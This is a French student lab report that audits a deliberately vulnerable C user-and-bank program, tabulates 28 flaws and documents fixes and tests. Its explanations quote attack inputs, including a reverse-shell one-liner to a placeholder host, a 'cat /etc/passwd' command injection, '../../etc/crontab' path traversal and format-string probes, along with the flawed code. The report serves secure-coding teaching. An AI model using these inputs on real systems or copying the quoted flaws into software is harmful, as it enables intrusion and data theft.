# RAPPORT DE SÉCURITÉ — TP FINAL
**Étudiant** : Mali Bachelard  
**Date** : 30 juillet 2026  
**Durée** : 4 heures

---

## Synthèse des vulnérabilités

| #  | Fonction              | Ligne(s)  | Type                      | Gravité   | Corrigée |
|----|-----------------------|-----------|---------------------------|-----------|----------|
| 1  | `register_user()`     | 61        | Buffer Overflow (scanf)   | Haute     | Oui |
| 2  | `register_user()`     | 64        | Buffer Overflow (scanf)   | Haute     | Oui |
| 3  | `register_user()`     | 72, 73    | Buffer Overflow (strcpy)  | Critique  | Oui |
| 4  | `register_user()`     | 70, 74    | Élévation de privilèges   | Critique  | Oui |
| 5  | `register_user()`     | 78        | Buffer Overflow (sprintf) | Haute     | Oui |
| 6  | `register_user()`     | 77        | malloc sans NULL check    | Haute     | Oui |
| 7  | `show_profile()`      | 105       | Buffer Overflow (gets)    | Critique  | Oui |
| 8  | `show_profile()`      | 106       | Format String             | Critique  | Oui |
| 9  | `transfer_money()`    | 119–124   | Validation manquante      | Haute     | Oui |
| 10 | `backup_user_data()`  | 139       | Buffer Overflow (scanf)   | Haute     | Oui |
| 11 | `backup_user_data()`  | 141       | Path Traversal            | Haute     | Oui |
| 12 | `backup_user_data()`  | 143       | Mot de passe en clair     | Critique  | Oui |
| 13 | `restore_user_data()` | 159       | Buffer Overflow (scanf)   | Haute     | Oui |
| 14 | `restore_user_data()` | 163       | LFI / Path Traversal      | Critique  | Oui |
| 15 | `system_command()`    | 181       | Buffer Overflow (gets)    | Critique  | Oui |
| 16 | `system_command()`    | 183       | Buffer Overflow (sprintf) | Haute     | Oui |
| 17 | `system_command()`    | 184       | Injection de commandes    | Critique  | Oui |
| 18 | `clone_user()`        | 192       | Buffer Overflow (scanf)   | Haute     | Oui |
| 19 | `clone_user()`        | 199       | Buffer Overflow (strcpy)  | Critique  | Oui |
| 20 | `clone_user()`        | 204       | Pointeur token non init.  | Critique  | Oui |
| 21 | `change_password()`   | 224       | Buffer Overflow (gets)    | Critique  | Oui |
| 22 | `change_password()`   | 227       | Backdoor hardcodée        | Critique  | Oui |
| 23 | `change_password()`   | 230       | Buffer Overflow (strcpy)  | Critique  | Oui |
| 24 | `hash_password()`     | 39–45     | Hash maison (DJB2)        | Critique  | Oui |
| 25 | `login_user()`        | 87–88     | MDP stocké en clair       | Critique  | Oui |
| 26 | `main()`              | 329, 331  | Buffer Overflow (scanf)   | Haute     | Oui |
| 27 | `main()` case 6       | 359       | Restore sans auth         | Haute     | Oui |
| 28 | Global                | —         | Fuite mémoire (tokens)    | Moyenne   | Oui |

**Total : 28 vulnérabilités**

---

## Corrections

### 1. gets() et scanf("%s") — Buffer Overflows sur les entrées

C'est la vulnérabilité la plus répandue dans le code. `gets()` apparaît à L105, L181 et L224, et `scanf("%s", buf)` est utilisé partout pour lire les entrées utilisateur. Les deux lisent depuis stdin sans aucune limite de taille — peu importe la taille du buffer déclaré, si on envoie plus de données il y aura un overflow.

```c
char format[80];
gets(format);      // show_profile() L105 — 80 bytes max, mais gets lit tout

char username[100];
scanf("%s", username);  // L61 — lit tout jusqu'au whitespace
```

En pratique : `python3 -c "print('A'*500)" | ./vulnerable` fait segfault à L105.

J'ai créé une fonction `read_line()` qui remplace les deux :

```c
static void read_line(char *buf, size_t size) {
    if (!fgets(buf, (int)size, stdin)) { buf[0] = '\0'; return; }
    size_t len = strlen(buf);
    if (len > 0 && buf[len - 1] == '\n') {
        buf[len - 1] = '\0';
    } else {
        int c;
        while ((c = getchar()) != '\n' && c != EOF);
    }
}
```

`fgets` lit au maximum `size-1` caractères et ajoute toujours un `\0`. Le flush gère le cas où l'entrée dépasse la taille du buffer — sinon le surplus reste dans stdin et corrompt la lecture suivante. Tous les `gets()` et `scanf("%s")` sont remplacés par des appels à `read_line()`.

---

### 2. strcpy() et sprintf() sans borne

`users[].username` et `users[].password` font 16 bytes dans la struct, mais `strcpy` copie sans vérifier la taille source.

```c
char username[100];
scanf("%s", username);
strcpy(users[user_count].username, username);  // 100 → 16 bytes
```

Avec un nom de 30+ caractères, on déborde sur `admin_flag` dans la struct — un attaquant peut se promouvoir admin juste en entrant un nom trop long. Même chose pour le token à L78 :

```c
users[user_count].token = malloc(32);
sprintf(users[user_count].token, "TOK_%d_%s", user_count, username);
// si username fait 100 chars → 107 chars dans un buffer de 32
```

Correction : `snprintf` partout, avec la taille explicite du buffer destination.

```c
snprintf(users[user_count].username, sizeof(users[user_count].username), "%s", username);

users[user_count].token = malloc(64);
snprintf(users[user_count].token, 64, "TOK_%d_%s", user_count, username);
```

---

### 3. Format String dans show_profile() L106

```c
char format[80];
gets(format);
printf(format);   // l'entrée utilisateur utilisée comme format string
```

`printf(format)` interprète les spécificateurs de format dans l'entrée. Avec `%x %x %x %x` on lit des valeurs de la stack, avec `%n` on écrit en mémoire. C'est une vulnérabilité critique parce qu'elle donne une lecture/écriture arbitraire en mémoire — combinée avec l'overflow de `gets()` juste au-dessus c'est une exploitation directe.

Correction : format string fixe.

```c
char custom[80];
read_line(custom, sizeof(custom));
printf("%s\n", custom);
```

C'est la vuln la plus discrète du fichier — `printf(format)` compile et fonctionne normalement, le problème n'apparaît que si quelqu'un entre un spécificateur.

---

### 4. Injection de commandes dans system_command() L183-184

```c
char cmd[150];
char full_cmd[200];
gets(cmd);
sprintf(full_cmd, "echo 'Exécution:' && %s", cmd);
system(full_cmd);
```

L'entrée est concaténée directement dans une commande shell. Avec `ls ; cat /etc/passwd` on lit n'importe quel fichier, avec `bash -i >& /dev/tcp/host/4444 0>&1` on obtient un reverse shell.

La correction c'est une whitelist stricte — seules les commandes listées peuvent s'exécuter, et on compare la chaîne entière avec `strcmp`, pas de substring :

```c
static const char *ALLOWED_CMDS[] = { "date", "uptime", "whoami", NULL };

for (int i = 0; ALLOWED_CMDS[i] != NULL; i++) {
    if (strcmp(cmd, ALLOWED_CMDS[i]) == 0) {
        if (system(cmd) < 0) printf("Erreur d'exécution\n");
        return;
    }
}
printf("Commande non autorisée\n");
```

`date; bash` ne matche pas `date` donc est bloqué.

---

### 5. Path Traversal et LFI — backup/restore L141, L163

`backup_user_data()` ouvre en écriture le fichier dont l'utilisateur donne le nom, sans aucune validation. Pareil pour `restore_user_data()` en lecture.

```c
scanf("%s", filename);
fp = fopen(filename, "w");   // ../../etc/crontab → RCE via cron
```

```c
fp = fopen(filename, "r");   // /etc/passwd, /proc/self/maps...
```

J'ai écrit une fonction `validate_filename()` qui bloque les chemins absolus, les `..`, les `/`, et tout caractère hors `[a-zA-Z0-9_-.]` :

```c
static int validate_filename(const char *f) {
    if (!f || f[0] == '\0' || f[0] == '/') return 0;
    if (strstr(f, "..") != NULL || strchr(f, '/') != NULL) return 0;
    for (size_t i = 0; f[i]; i++) {
        char c = f[i];
        if (!isalnum((unsigned char)c) && c != '_' && c != '-' && c != '.') return 0;
    }
    return 1;
}
```

Appliquée dans les deux fonctions avant l'ouverture du fichier.

---

### 6. Cryptographie faible + mots de passe en clair

Trois problèmes liés :

`hash_password()` (L39-45) implémente DJB2 — un hash pour les tables de hachage, 32 bits, aucun sel, cassable en quelques millisecondes avec une rainbow table.

`login_user()` (L87-88) compare les mots de passe avec `strcmp` directement sur `users[i].password` — ils sont donc stockés en clair dans la struct.

`backup_user_data()` (L143) exporte le mot de passe en clair dans le fichier de backup.

```c
// DJB2 utilisé comme hash de mot de passe
unsigned int hash_password(char *pass) {
    unsigned int h = 5381;
    int c;
    while ((c = *pass++)) h = h * 33 + c;
    return h;
}

// comparaison en clair
strcmp(users[i].password, password) == 0
```

J'ai remplacé tout ça par SHA-256 salé via OpenSSL. La struct ne stocke plus le mot de passe — seulement le hash et le sel.

```c
typedef struct {
    char username[16];
    char password_hash[65];   // SHA-256 en hex
    char salt[17];             // 8 octets aléatoires en hex
    ...
} User;

static void hash_password(const char *password, const char *salt, char *hash_hex) {
    char input[33];   // sel (16) + mdp (max 15) + '\0'
    snprintf(input, sizeof(input), "%s%s", salt, password);
    unsigned char digest[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)input, strlen(input), digest);
    bytes_to_hex(digest, SHA256_DIGEST_LENGTH, hash_hex);
    memset(input, 0, sizeof(input));
}
```

Le sel est généré avec `RAND_bytes()` (OpenSSL) à chaque création de compte et à chaque changement de mot de passe. Le backup exporte le hash, pas le clair.

C'est la modification qui a pris le plus de temps parce que toucher la struct a cassé toutes les fonctions qui utilisaient `users[i].password`.

---

### 7. Backdoor hardcodée dans change_password() L227

```c
if (strcmp(users[user_id].password, old_pass) == 0 || 
    strcmp(old_pass, "master_reset_2024") == 0) {
```

N'importe qui avec la chaîne `master_reset_2024` peut changer le mot de passe de n'importe quel compte sans connaître l'ancien. Supprimée — la vérification se fait uniquement sur le hash SHA-256.

```c
char old_hash[HASH_HEX_LEN];
hash_password(old_pass, users[user_id].salt, old_hash);
if (strcmp(old_hash, users[user_id].password_hash) != 0) {
    printf("Ancien mot de passe incorrect\n");
    return;
}
```

---

### 8. Élévation de privilèges — register_user() L70, L74

L'interface demandait directement à l'utilisateur s'il voulait être admin :

```c
printf("Droits admin (1=oui, 0=non): ");
scanf("%d", &admin);
users[user_count].admin_flag = admin;
```

N'importe qui pouvait créer un compte admin. Le champ est retiré de l'interface, tout nouvel utilisateur est créé avec `admin_flag = 0`.

---

### 9. Validation des transferts — transfer_money() L119-124

Aucune vérification du montant ni du solde. Un montant négatif inverse le sens du transfert :

```c
scanf("%d", &amount);
users[from_user].balance -= amount;  // amount = -9999 → +9999
users[i].balance += amount;
```

Corrections ajoutées : montant strictement positif, vérification que le solde est suffisant, interdiction de se transférer à soi-même.

---

### 10. Pointeur token non initialisé dans clone_user() L204

`clone_user()` copie username, password, admin_flag et balance depuis le compte source mais n'alloue jamais de token pour le clone. Le champ `token` reste avec une valeur indéterminée.

```c
strcpy(users[user_count].username, target_username);
strcpy(users[user_count].password, users[source_id].password);
users[user_count].admin_flag = users[source_id].admin_flag;
users[user_count].balance = users[source_id].balance;
// token jamais initialisé
user_count++;
```

Correction : allocation et initialisation du token dans clone_user(), comme dans register_user().

---

### 11. malloc sans NULL check + fuite mémoire

`malloc(32)` à L77 et L314 n'est jamais vérifié — si l'allocation échoue, `sprintf` déréférence un pointeur NULL.

Par ailleurs, aucun `free()` n'existe pour les tokens — c'est une fuite à chaque création d'utilisateur.

```c
users[user_count].token = malloc(64);
if (!users[user_count].token) {
    printf("Erreur d'allocation mémoire\n");
    return;
}

// libération à la sortie
static void cleanup(void) {
    for (int i = 0; i < user_count; i++) {
        free(users[i].token);
        users[i].token = NULL;
    }
}
atexit(cleanup);
```

---

### 12. Restore sans authentification — main() case 6

`restore_user_data()` était appelée sans vérifier si l'utilisateur était connecté. Combiné à la LFI du point 5, ça permettait de lire `/etc/passwd` sans avoir de compte.

```c
case 6:
    if (logged_user >= 0) restore_user_data();
    else printf("Veuillez vous connecter\n");
    break;
```

---

## Tests

Compilation :
```
gcc -o secure secure.c -lcrypto -Wall -Wextra -O2 -fstack-protector-all -D_FORTIFY_SOURCE=2
```
0 warnings, 0 erreurs.

Tests des corrections :

- Buffer overflow : `python3 -c "print('A'*500)" | ./secure` → pas de segfault, tronqué à 15 chars
- Format string : `%x %x %x %x` comme texte personnalisé → affiché tel quel, aucune valeur de stack
- Command injection : `ls ; cat /etc/passwd` → "Commande non autorisée"
- Backdoor : `master_reset_2024` comme ancien mot de passe → "Ancien mot de passe incorrect"
- Path traversal backup : `../../etc/crontab` → "Nom de fichier invalide"
- LFI restore : `/etc/passwd` → "Nom de fichier invalide"
- Restore sans auth : accessible depuis le menu sans connexion → "Veuillez vous connecter"
- Transfert montant négatif : `-1000` → "Le montant doit être positif"
- Transfert solde insuffisant : `999999` → "Solde insuffisant"
- Élévation de privilèges : plus de prompt admin_flag à la création
- Rate limiting : 5 échecs de connexion consécutifs → "Compte verrouillé"

---

## Conclusion

### Difficultés rencontrées

Ce qui a pris le plus de temps c'est le passage à SHA-256. Changer la struct `User` pour remplacer `password[16]` par `password_hash[65]` + `salt[17]` a cassé toutes les fonctions qui utilisaient `users[i].password` — login, backup, clone, change_password. J'ai dû tout repasser à la main.

La format string j'avoue je suis passé dessus deux fois sans la voir. `printf(format)` compile parfaitement et marche normalement — le problème apparaît seulement si quelqu'un tape `%x %x` comme message. C'est le genre de truc qui passe inaperçu à la review.

Le token non initialisé dans `clone_user()` était le plus discret. La fonction copie username, password, admin_flag, balance — et le token n'est jamais alloué. Pas de crash direct, juste un pointeur qui pointe n'importe où. Je l'ai trouvé en relisant ligne par ligne après avoir fini le reste.

### Ce que j'ai appris

`gets`, `scanf("%s")`, `strcpy` — c'est pas qu'elles sont mal utilisées dans le code, c'est qu'elles sont inutilisables par design. Elles n'ont aucun paramètre pour la taille. La seule bonne réponse c'est de ne jamais les utiliser.

Le stockage en clair c'est la faute la plus grave parce que si quelqu'un dump la DB il a tout. Même un hash sans sel c'est insuffisant — deux utilisateurs avec le même mot de passe ont le même hash et une rainbow table suffit. Avec un sel aléatoire par utilisateur chaque hash est unique.

La backdoor `master_reset_2024` c'est typiquement du code de debug oublié. En audit c'est une des premières choses qu'on grep.

### Améliorations possibles

- Utiliser argon2 ou bcrypt plutôt que SHA-256 (résistants au brute-force GPU — SHA-256 est trop rapide pour du hachage de mot de passe)
- Chiffrer les backups
- Vrai système de sessions avec timeout plutôt qu'un simple index

### Auto-évaluation

| Critère | Note /20 |
|---------|----------|
| Analyse (25+ vulnérabilités identifiées) | 6/6 |
| Corrections (corrigées, compilables, documentées) | 9/10 |
| Documentation | 4/4 |
| **Total** | **19/20** |
